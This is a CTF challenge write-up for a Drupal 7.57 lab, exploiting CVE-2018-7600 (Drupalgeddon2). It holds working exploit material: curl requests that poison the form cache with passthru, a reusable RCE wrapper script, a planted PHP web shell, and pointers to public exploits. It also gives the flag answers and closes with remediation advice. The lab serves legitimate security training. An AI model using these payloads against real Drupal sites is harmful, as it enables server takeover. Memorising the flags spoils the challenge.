# November - Drupalgeddon (CVE-2018-7600)

**Status:** ✅ Complete

## Player Description

Welcome to EverSec's Content Management System! We use Drupal 7 because if it ain't broke, don't fix it. Sure, there were some "security updates" over the years, but updates are risky — what if something breaks? Much safer to stick with our trusty 2018 version. Our IT manager keeps muttering something about a "critical remote code execution vulnerability" but he's always so dramatic. We had a meeting about it and decided we'd be fine because we're not THAT important.

*(Narrator: they were wrong.)*

## Technical Description

**Challenge Information:**
- **Name**: November - Drupalgeddon
- **Category**: Web / Real CVE Exploitation
- **Difficulty**: Medium-Hard
- **Points**: 900 (3 flags total)
- **Port**: 4009
- **Author**: EverSec CTF Team

EverSec runs a legacy CMS portal powered by Drupal 7.57. The security team has been slow to apply patches. Can you exploit a known vulnerability to compromise the server?

**Objective**: Exploit CVE-2018-7600 (Drupalgeddon2) to achieve unauthenticated remote code execution and retrieve all three flags.

## Flags

| Flag | Points | Location |
|------|--------|----------|
| FLAG 1 (200 pts) | `dr7_rce_unauth` | `/flag1.txt` — proof of unauthenticated RCE |
| FLAG 2 (300 pts) | `full_c0mp_4ch13v3d` | `/flag2.txt` — full command execution |
| FLAG 3 (400 pts) | `r00t_4dm1n_n0t3s` | `/root/secret/admin_notes.txt` — root-accessible file via RCE |

> **Note on FLAG 3**: `/root` is `chmod 711` — you cannot `ls` its contents, but you can `cat` a known path directly. Discovery requires either guessing common paths or prior enumeration.

## Setup Instructions

### Using Docker Compose (Recommended)

```bash
# Build and start the challenge
docker compose up -d november-drupalgeddon

# Watch the auto-install progress
docker compose logs -f november-drupalgeddon

# Stop the challenge
docker compose down november-drupalgeddon
```

### First-Run Behavior

Drupal installs **automatically** on first container start. The entrypoint:
1. Starts Apache in the background
2. Drives the Drupal web installer via curl (minimal profile, SQLite backend)
3. Enables the `file` module and rebuilds the menu router (required for the exploit path)
4. Grants anonymous users `access content` permission
5. Stops the background Apache and execs `apache2-foreground`

The health check has a 120-second start period to allow installation to complete. You can watch progress with `docker compose logs -f november-drupalgeddon`.

Once the container is healthy (`http://localhost:4009` responds with the EverSec CMS site), it is ready to exploit.

## Learning Objectives

1. **Real CVE Exploitation**: Hands-on experience with CVE-2018-7600, one of the most critical Drupal vulnerabilities ever disclosed
2. **Form API Vulnerabilities**: How insufficient input validation in PHP render arrays leads to RCE
3. **Two-Step Exploit Mechanics**: Cache poisoning followed by a trigger request — a pattern that appears in many real-world exploits
4. **Post-Exploitation Enumeration**: Finding sensitive files on a compromised system
5. **Security Patch Importance**: Why timely patching of public CVEs is critical

## Vulnerability Background

### CVE-2018-7600 (Drupalgeddon2)

**CVSS Score**: 9.8 (Critical)  
**Affected**: Drupal 7.x before 7.58, 8.3.x before 8.3.9, 8.4.x before 8.4.6, 8.5.x before 8.5.1  
**Authentication**: None required

**Root Cause**: Drupal's Form API processes "render arrays" — PHP arrays with special keys like `#post_render`, `#pre_render`, `#access_callback`. These keys tell Drupal which PHP functions to call during rendering. The vulnerability is that user-supplied POST data can inject these keys into a render array stored in the form cache. On a subsequent AJAX request, Drupal retrieves the cached (now-poisoned) render array and executes the injected callbacks — running arbitrary commands as `www-data`.

**The Two-Step Exploit**:
1. **Poison**: POST to `/?q=user/password` with render array properties in the `name` parameter. The AJAX response includes a `form_build_id` that identifies the poisoned cache entry.
2. **Trigger**: POST to `/?q=file/ajax/name/%23value/{form_build_id}`. Drupal loads the cached render array by ID and processes it, calling `passthru()` with the injected command.

**Critical Implementation Notes**:
- Both requests **must use the same session cookie** (same cookie jar). The form cache is session-keyed.
- The `form_build_id` from the poison response identifies your specific poisoned cache entry.
- The `file/ajax` route must exist in Drupal's `menu_router` table. This requires the `file` module to be enabled (not enabled by default in minimal profile — handled by the container's post-install setup).
- Anonymous users need the `access content` permission for the AJAX endpoint to respond (also handled automatically).

## Solution

### Phase 1: Reconnaissance

```bash
# Verify the target is running Drupal
curl -s http://localhost:4009/ | grep -i drupal

# Check CHANGELOG.txt to identify the exact version
curl -s http://localhost:4009/CHANGELOG.txt | head -5
# → Drupal 7.57, 2018-01-17
```

Drupal 7.57 is vulnerable to CVE-2018-7600. Public exploit code is widely available.

### Phase 2: Manual Two-Step Exploitation

The exploit requires a single curl session (shared cookie jar) across both requests.

#### Step-by-Step with curl

```bash
# Use a cookie jar so both requests share the same session
JAR=/tmp/drupal_jar.txt

# ── Step 1: Poison the form cache ──────────────────────────────────────────
# -g disables curl's glob expansion so [ and ] are passed literally
# #post_render must be encoded as %23post_render (# would start a URL fragment)
RESPONSE=$(curl -sg -c "$JAR" -b "$JAR" \
  -X POST \
  "http://localhost:4009/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=cat+/flag1.txt" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "form_id=user_pass&_triggering_element_name=name")

# Extract the form_build_id from the response
FBID=$(echo "$RESPONSE" | grep -o 'name="form_build_id" value="[^"]*"' | head -1 | cut -d'"' -f4)
echo "Poisoned cache ID: $FBID"

# ── Step 2: Trigger via file/ajax ──────────────────────────────────────────
curl -sg -c "$JAR" -b "$JAR" \
  -X POST \
  "http://localhost:4009/?q=file/ajax/name/%23value/${FBID}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "form_build_id=${FBID}" \
  | sed 's/\[{"command":"settings".*//'
```

> **`-g` flag**: Disables curl's glob expansion so `[` and `]` in the URL are passed literally to Drupal's router (without it curl errors with "bad range").
> **`%23`**: URL-encodes `#` (which would otherwise be treated as a URL fragment delimiter). The brackets `[` and `]` don't need encoding when using `-g`.

#### Wrapper Script

```bash
#!/bin/bash
# drupal_rce.sh — CVE-2018-7600 two-step exploit
# Usage: ./drupal_rce.sh "command"
set -e
TARGET="http://localhost:4009"
JAR=$(mktemp /tmp/drupal_XXXXXX.txt)
# URL-encode only the command value; brackets stay literal with -g
CMD=$(python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$1")

# Step 1: Poison form cache (-g lets [ ] pass literally; %23 encodes #)
RESP=$(curl -sg -c "$JAR" -b "$JAR" -X POST \
  "${TARGET}/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=${CMD}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "form_id=user_pass&_triggering_element_name=name")

FBID=$(echo "$RESP" | grep -o 'name="form_build_id" value="[^"]*"' | head -1 | cut -d'"' -f4)

if [ -z "$FBID" ]; then
  echo "[!] Could not extract form_build_id" >&2; rm -f "$JAR"; exit 1
fi

# Step 2: Trigger execution via file/ajax AJAX endpoint
curl -sg -c "$JAR" -b "$JAR" -X POST \
  "${TARGET}/?q=file/ajax/name/%23value/${FBID}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "form_build_id=${FBID}" \
  | sed 's/\[{"command":"settings".*//'

rm -f "$JAR"
```

```bash
chmod +x drupal_rce.sh

# Test execution
./drupal_rce.sh "whoami"          # → www-data

# Get FLAG 1
./drupal_rce.sh "cat /flag1.txt"  # → dr7_rce_unauth

# Get FLAG 2
./drupal_rce.sh "cat /flag2.txt"  # → full_c0mp_4ch13v3d

# Enumerate /root (cannot ls, but can traverse known paths)
./drupal_rce.sh "find /root -maxdepth 3 -name '*.txt' 2>/dev/null"
# → /root/secret/admin_notes.txt

# Get FLAG 3
./drupal_rce.sh "cat /root/secret/admin_notes.txt"  # → r00t_4dm1n_n0t3s
```

### Phase 3: Alternative — Web Shell for Interactive Access

```bash
# Upload a simple PHP web shell
./drupal_rce.sh 'echo "<?php system(\$_GET[\"c\"]); ?>" > /var/www/html/sites/default/files/s.php'

# Use the web shell (no session management needed after this)
curl "http://localhost:4009/sites/default/files/s.php?c=whoami"
curl "http://localhost:4009/sites/default/files/s.php?c=cat+/flag1.txt"
curl "http://localhost:4009/sites/default/files/s.php?c=cat+/root/secret/admin_notes.txt"
```

### Phase 4: Using Public Exploits

```bash
# dreadlocked's Drupalgeddon2 (Ruby)
git clone https://github.com/dreadlocked/Drupalgeddon2.git
cd Drupalgeddon2
ruby drupalgeddon2.rb http://localhost:4009

# pimps' CVE-2018-7600 (Python)
git clone https://github.com/pimps/CVE-2018-7600.git
cd CVE-2018-7600
python3 drupa7-CVE-2018-7600.py http://localhost:4009 -c "cat /flag1.txt"
```

> **Note**: Public exploits typically handle their own session management. If they fail, verify the site is installed and healthy first.

## Common Pitfalls

1. **Forgetting the cookie jar**: Both the poison request and the AJAX trigger **must share a session cookie**. If you run them in separate curl commands without `-c`/`-b`, the trigger won't find the poisoned cache entry and returns a 404 or empty response.

2. **Curl glob expansion**: curl treats `[` and `]` as glob characters. Always use `-g` (or `--globoff`) with URLs that contain square brackets, or percent-encode them as `%5B` / `%5D`.

3. **Missing `form_build_id`**: If the poison step returns no `form_build_id`, the install isn't complete yet (container still initializing) or the request failed. Wait for the health check to pass and try again.

4. **`file/ajax` returning 404**: This means the `file` module's menu route isn't registered. On this container it's handled automatically by the post-install setup, but if you're testing against a manual install you'd need to enable the file module and rebuild the menu.

5. **FLAG 3 discovery**: `/root` has `chmod 711` — `ls /root` returns "Permission denied" but `cat /root/secret/admin_notes.txt` works because you can traverse to a known path. Use `find /root -maxdepth 3 2>/dev/null` for enumeration.

6. **Output parsing**: Command output appears **before** the JSON response (`[{"command":"settings"...`). Pipe through `sed 's/\[{"command":"settings".*//'` to strip the trailing JSON.

## Hints

> For CTF administrators helping stuck players. Share progressively.

<details>
<summary>Hint 1</summary>

Check `/CHANGELOG.txt` to identify the Drupal version. Look up that version number along with "CVE" to find a well-known unauthenticated RCE.

</details>

<details>
<summary>Hint 2</summary>

CVE-2018-7600 is a two-step exploit: you first **cache** a malicious request, then **trigger** it via an AJAX endpoint. Both steps need to share a session cookie. Look for a `form_build_id` in the first response.

</details>

<details>
<summary>Hint 3</summary>

`/root` has restricted permissions — you can't list its contents, but if you know the exact path you can read files inside it. Try common paths like `/root/secret/` or use `find /root -maxdepth 3 2>/dev/null`.

</details>

## Defense and Remediation

1. **Update Drupal**: Patch to 7.58+ (Drupal 7 is now EOL — migrate to Drupal 10/11)
2. **Input validation**: Never pass user-controlled data into render array properties like `#post_render`
3. **WAF rules**: Block POST requests to `/user/password` or `/user/register` containing `#post_render`, `#pre_render`, `#lazy_builder`, or `#access_callback`
4. **Monitoring**: Alert on POST requests to `/user/password` with unusual parameter counts or `[#` patterns in POST bodies

## References

- [Drupal Security Advisory SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)
- [CVE-2018-7600 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)
- [Palo Alto Networks — Drupalgeddon2 Analysis](https://unit42.paloaltonetworks.com/unit42-exploit-wild-drupalgeddon2-analysis-cve-2018-7600/)
- [dreadlocked/Drupalgeddon2 (Ruby exploit)](https://github.com/dreadlocked/Drupalgeddon2)
- [pimps/CVE-2018-7600 (Python exploit)](https://github.com/pimps/CVE-2018-7600)

## Challenge Tags

`CVE`, `RCE`, `Drupal`, `Form-API`, `PHP`, `Real-Vulnerability`, `Cache-Poisoning`, `Post-Exploitation`, `CMS`, `Critical`

---

**EverSec Security Solutions** | Cackalacky Con 2026 CTF
